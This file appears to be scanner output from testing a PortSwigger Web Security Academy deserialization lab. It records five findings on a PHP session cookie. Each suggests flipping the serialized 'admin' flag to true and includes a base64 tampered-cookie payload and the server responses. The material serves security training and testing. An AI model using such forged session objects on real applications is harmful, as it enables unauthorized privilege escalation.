@@ -1,0 +1,211 @@
+{
+  "target": "0a8400c80473b773807d1c92002900dc.web-security-academy.net",
+  "stats": {
+    "vectors_scanned": 143,
+    "after_filter": 5,
+    "findings": 5,
+    "likely_vulnerable": 0
+  },
+  "findings": [
+    {
+      "url": "https://0a8400c80473b773807d1c92002900dc.web-security-academy.net/",
+      "method": "GET",
+      "location": "cookie",
+      "name": "session",
+      "type": "PHP",
+      "subtype": null,
+      "confidence": "High",
+      "exploit_type": "Privilege Escalation — Boolean Flip",
+      "suggested_probe": "flip_boolean",
+      "severity": "High",
+      "severity_note": null,
+      "confirmation_status": "Suspected",
+      "notes": "Boolean field detected — try flipping b:0 → b:1",
+      "normalized": [
+        "O:4:\"User\":2:{s:8:\"username\";s:6:\"wiener\";s:5:\"admin\";b:0;}"
+      ],
+      "mutations_count": 1,
+      "likely_vulnerable": false,
+      "indicators": [],
+      "attempts": [
+        {
+          "payload_type": "flip_boolean",
+          "chain": null,
+          "payload": "Tzo0OiJVc2VyIjoyOntzOjg6InVzZXJuYW1lIjtzOjY6IndpZW5lciI7czo1OiJhZG1pbiI7YjoxO30=",
+          "likely_vulnerable": false,
+          "indicators": [],
+          "baseline": {
+            "status": 200,
+            "length": 10680,
+            "body_sample": "<!DOCTYPE html>\n<html>\n<!--LAB_HEAD_START-->\n    <head>\n        <link href=/resources/labheader/css/academyLabHeader.css rel=stylesheet>\n        <link href=/resources/css/labsEcommerce.css rel=stylesheet>\n        <title>Modifying serialized objects</title>\n    </head>\n<!--LAB_HEAD_END-->\n    <body>\n        <script src=\"/resources/labheader/js/labHeader.js\"></script>\n        <!--LAB_HEADER_START-->\n        <div id=\"academyLabHeader\">\n            <section class='academyLabBanner'>\n                <div class=container>\n                    <div class=logo></div>\n                        <div class=title-container>\n                            <h2>Modifying serialized objects</h2>\n                            <a class=link-back href='https://portswigger.net/web-security/deserialization/exploiting/"
+          },
+          "mutated": {
+            "status": 200,
+            "length": 10749,
+            "body_sample": "<!DOCTYPE html>\n<html>\n<!--LAB_HEAD_START-->\n    <head>\n        <link href=/resources/labheader/css/academyLabHeader.css rel=stylesheet>\n        <link href=/resources/css/labsEcommerce.css rel=stylesheet>\n        <title>Modifying serialized objects</title>\n    </head>\n<!--LAB_HEAD_END-->\n    <body>\n        <script src=\"/resources/labheader/js/labHeader.js\"></script>\n        <!--LAB_HEADER_START-->\n        <div id=\"academyLabHeader\">\n            <section class='academyLabBanner'>\n                <div class=container>\n                    <div class=logo></div>\n                        <div class=title-container>\n                            <h2>Modifying serialized objects</h2>\n                            <a class=link-back href='https://portswigger.net/web-security/deserialization/exploiting/"
+          }
+        }
+      ]
+    },
+    {
+      "url": "https://0a8400c80473b773807d1c92002900dc.web-security-academy.net/product?productId=1",
+      "method": "GET",
+      "location": "cookie",
+      "name": "session",
+      "type": "PHP",
+      "subtype": null,
+      "confidence": "High",
+      "exploit_type": "Privilege Escalation — Boolean Flip",
+      "suggested_probe": "flip_boolean",
+      "severity": "High",
+      "severity_note": null,
+      "confirmation_status": "Suspected",
+      "notes": "Boolean field detected — try flipping b:0 → b:1",
+      "normalized": [
+        "O:4:\"User\":2:{s:8:\"username\";s:6:\"wiener\";s:5:\"admin\";b:0;}"
+      ],
+      "mutations_count": 1,
+      "likely_vulnerable": false,
+      "indicators": [],
+      "attempts": [
+        {
+          "payload_type": "flip_boolean",
+          "chain": null,
+          "payload": "Tzo0OiJVc2VyIjoyOntzOjg6InVzZXJuYW1lIjtzOjY6IndpZW5lciI7czo1OiJhZG1pbiI7YjoxO30=",
+          "likely_vulnerable": false,
+          "indicators": [],
+          "baseline": {
+            "status": 200,
+            "length": 4467,
+            "body_sample": "<!DOCTYPE html>\n<html>\n<!--LAB_HEAD_START-->\n    <head>\n        <link href=/resources/labheader/css/academyLabHeader.css rel=stylesheet>\n        <link href=/resources/css/labsEcommerce.css rel=stylesheet>\n        <title>Modifying serialized objects</title>\n    </head>\n<!--LAB_HEAD_END-->\n    <body>\n        <script src=\"/resources/labheader/js/labHeader.js\"></script>\n        <!--LAB_HEADER_START-->\n        <div id=\"academyLabHeader\">\n            <section class='academyLabBanner'>\n                <div class=container>\n                    <div class=logo></div>\n                        <div class=title-container>\n                            <h2>Modifying serialized objects</h2>\n                            <a class=link-back href='https://portswigger.net/web-security/deserialization/exploiting/"
+          },
+          "mutated": {
+            "status": 200,
+            "length": 4536,
+            "body_sample": "<!DOCTYPE html>\n<html>\n<!--LAB_HEAD_START-->\n    <head>\n        <link href=/resources/labheader/css/academyLabHeader.css rel=stylesheet>\n        <link href=/resources/css/labsEcommerce.css rel=stylesheet>\n        <title>Modifying serialized objects</title>\n    </head>\n<!--LAB_HEAD_END-->\n    <body>\n        <script src=\"/resources/labheader/js/labHeader.js\"></script>\n        <!--LAB_HEADER_START-->\n        <div id=\"academyLabHeader\">\n            <section class='academyLabBanner'>\n                <div class=container>\n                    <div class=logo></div>\n                        <div class=title-container>\n                            <h2>Modifying serialized objects</h2>\n                            <a class=link-back href='https://portswigger.net/web-security/deserialization/exploiting/"
+          }
+        }
+      ]
+    },
+    {
+      "url": "https://0a8400c80473b773807d1c92002900dc.web-security-academy.net/my-account?id=wiener",
+      "method": "GET",
+      "location": "cookie",
+      "name": "session",
+      "type": "PHP",
+      "subtype": null,
+      "confidence": "High",
+      "exploit_type": "Privilege Escalation — Boolean Flip",
+      "suggested_probe": "flip_boolean",
+      "severity": "High",
+      "severity_note": null,
+      "confirmation_status": "Suspected",
+      "notes": "Boolean field detected — try flipping b:0 → b:1",
+      "normalized": [
+        "O:4:\"User\":2:{s:8:\"username\";s:6:\"wiener\";s:5:\"admin\";b:0;}"
+      ],
+      "mutations_count": 1,
+      "likely_vulnerable": false,
+      "indicators": [],
+      "attempts": [
+        {
+          "payload_type": "flip_boolean",
+          "chain": null,
+          "payload": "Tzo0OiJVc2VyIjoyOntzOjg6InVzZXJuYW1lIjtzOjY6IndpZW5lciI7czo1OiJhZG1pbiI7YjoxO30=",
+          "likely_vulnerable": false,
+          "indicators": [],
+          "baseline": {
+            "status": 200,
+            "length": 3307,
+            "body_sample": "<!DOCTYPE html>\n<html>\n<!--LAB_HEAD_START-->\n    <head>\n        <link href=/resources/labheader/css/academyLabHeader.css rel=stylesheet>\n        <link href=/resources/css/labs.css rel=stylesheet>\n        <title>Modifying serialized objects</title>\n    </head>\n<!--LAB_HEAD_END-->\n    <body>\n        <script src=\"/resources/labheader/js/labHeader.js\"></script>\n        <!--LAB_HEADER_START-->\n        <div id=\"academyLabHeader\">\n            <section class='academyLabBanner'>\n                <div class=container>\n                    <div class=logo></div>\n                        <div class=title-container>\n                            <h2>Modifying serialized objects</h2>\n                            <a class=link-back href='https://portswigger.net/web-security/deserialization/exploiting/lab-deser"
+          },
+          "mutated": {
+            "status": 200,
+            "length": 3376,
+            "body_sample": "<!DOCTYPE html>\n<html>\n<!--LAB_HEAD_START-->\n    <head>\n        <link href=/resources/labheader/css/academyLabHeader.css rel=stylesheet>\n        <link href=/resources/css/labs.css rel=stylesheet>\n        <title>Modifying serialized objects</title>\n    </head>\n<!--LAB_HEAD_END-->\n    <body>\n        <script src=\"/resources/labheader/js/labHeader.js\"></script>\n        <!--LAB_HEADER_START-->\n        <div id=\"academyLabHeader\">\n            <section class='academyLabBanner'>\n                <div class=container>\n                    <div class=logo></div>\n                        <div class=title-container>\n                            <h2>Modifying serialized objects</h2>\n                            <a class=link-back href='https://portswigger.net/web-security/deserialization/exploiting/lab-deser"
+          }
+        }
+      ]
+    },
+    {
+      "url": "https://0a8400c80473b773807d1c92002900dc.web-security-academy.net/my-account?id=wiener",
+      "method": "GET",
+      "location": "cookie",
+      "name": "session",
+      "type": "PHP",
+      "subtype": null,
+      "confidence": "High",
+      "exploit_type": "Privilege Escalation — Boolean Flip",
+      "suggested_probe": "flip_boolean",
+      "severity": "High",
+      "severity_note": null,
+      "confirmation_status": "Suspected",
+      "notes": "Boolean field detected — try flipping b:0 → b:1",
+      "normalized": [
+        "O:4:\"User\":2:{s:8:\"username\";s:6:\"wiener\";s:5:\"admin\";b:0;}"
+      ],
+      "mutations_count": 1,
+      "likely_vulnerable": false,
+      "indicators": [],
+      "attempts": [
+        {
+          "payload_type": "flip_boolean",
+          "chain": null,
+          "payload": "Tzo0OiJVc2VyIjoyOntzOjg6InVzZXJuYW1lIjtzOjY6IndpZW5lciI7czo1OiJhZG1pbiI7YjoxO30=",
+          "likely_vulnerable": false,
+          "indicators": [],
+          "baseline": {
+            "status": 200,
+            "length": 3307,
+            "body_sample": "<!DOCTYPE html>\n<html>\n<!--LAB_HEAD_START-->\n    <head>\n        <link href=/resources/labheader/css/academyLabHeader.css rel=stylesheet>\n        <link href=/resources/css/labs.css rel=stylesheet>\n        <title>Modifying serialized objects</title>\n    </head>\n<!--LAB_HEAD_END-->\n    <body>\n        <script src=\"/resources/labheader/js/labHeader.js\"></script>\n        <!--LAB_HEADER_START-->\n        <div id=\"academyLabHeader\">\n            <section class='academyLabBanner'>\n                <div class=container>\n                    <div class=logo></div>\n                        <div class=title-container>\n                            <h2>Modifying serialized objects</h2>\n                            <a class=link-back href='https://portswigger.net/web-security/deserialization/exploiting/lab-deser"
+          },
+          "mutated": {
+            "status": 200,
+            "length": 3376,
+            "body_sample": "<!DOCTYPE html>\n<html>\n<!--LAB_HEAD_START-->\n    <head>\n        <link href=/resources/labheader/css/academyLabHeader.css rel=stylesheet>\n        <link href=/resources/css/labs.css rel=stylesheet>\n        <title>Modifying serialized objects</title>\n    </head>\n<!--LAB_HEAD_END-->\n    <body>\n        <script src=\"/resources/labheader/js/labHeader.js\"></script>\n        <!--LAB_HEADER_START-->\n        <div id=\"academyLabHeader\">\n            <section class='academyLabBanner'>\n                <div class=container>\n                    <div class=logo></div>\n                        <div class=title-container>\n                            <h2>Modifying serialized objects</h2>\n                            <a class=link-back href='https://portswigger.net/web-security/deserialization/exploiting/lab-deser"
+          }
+        }
+      ]
+    },
+    {
+      "url": "https://0a8400c80473b773807d1c92002900dc.web-security-academy.net/my-account?id=wiener",
+      "method": "GET",
+      "location": "cookie",
+      "name": "session",
+      "type": "PHP",
+      "subtype": null,
+      "confidence": "High",
+      "exploit_type": "Privilege Escalation — Boolean Flip",
+      "suggested_probe": "flip_boolean",
+      "severity": "High",
+      "severity_note": null,
+      "confirmation_status": "Suspected",
+      "notes": "Boolean field detected — try flipping b:0 → b:1",
+      "normalized": [
+        "O:4:\"User\":2:{s:8:\"username\";s:6:\"wiener\";s:5:\"admin\";b:0;}"
+      ],
+      "mutations_count": 1,
+      "likely_vulnerable": false,
+      "indicators": [],
+      "attempts": [
+        {
+          "payload_type": "flip_boolean",
+          "chain": null,
+          "payload": "Tzo0OiJVc2VyIjoyOntzOjg6InVzZXJuYW1lIjtzOjY6IndpZW5lciI7czo1OiJhZG1pbiI7YjoxO30=",
+          "likely_vulnerable": false,
+          "indicators": [],
+          "baseline": {
+            "status": 200,
+            "length": 3307,
+            "body_sample": "<!DOCTYPE html>\n<html>\n<!--LAB_HEAD_START-->\n    <head>\n        <link href=/resources/labheader/css/academyLabHeader.css rel=stylesheet>\n        <link href=/resources/css/labs.css rel=stylesheet>\n        <title>Modifying serialized objects</title>\n    </head>\n<!--LAB_HEAD_END-->\n    <body>\n        <script src=\"/resources/labheader/js/labHeader.js\"></script>\n        <!--LAB_HEADER_START-->\n        <div id=\"academyLabHeader\">\n            <section class='academyLabBanner'>\n                <div class=container>\n                    <div class=logo></div>\n                        <div class=title-container>\n                            <h2>Modifying serialized objects</h2>\n                            <a class=link-back href='https://portswigger.net/web-security/deserialization/exploiting/lab-deser"
+          },
+          "mutated": {
+            "status": 200,
+            "length": 3376,
+            "body_sample": "<!DOCTYPE html>\n<html>\n<!--LAB_HEAD_START-->\n    <head>\n        <link href=/resources/labheader/css/academyLabHeader.css rel=stylesheet>\n        <link href=/resources/css/labs.css rel=stylesheet>\n        <title>Modifying serialized objects</title>\n    </head>\n<!--LAB_HEAD_END-->\n    <body>\n        <script src=\"/resources/labheader/js/labHeader.js\"></script>\n        <!--LAB_HEADER_START-->\n        <div id=\"academyLabHeader\">\n            <section class='academyLabBanner'>\n                <div class=container>\n                    <div class=logo></div>\n                        <div class=title-container>\n                            <h2>Modifying serialized objects</h2>\n                            <a class=link-back href='https://portswigger.net/web-security/deserialization/exploiting/lab-deser"
+          }
+        }
+      ]
+    }
+  ]
+}
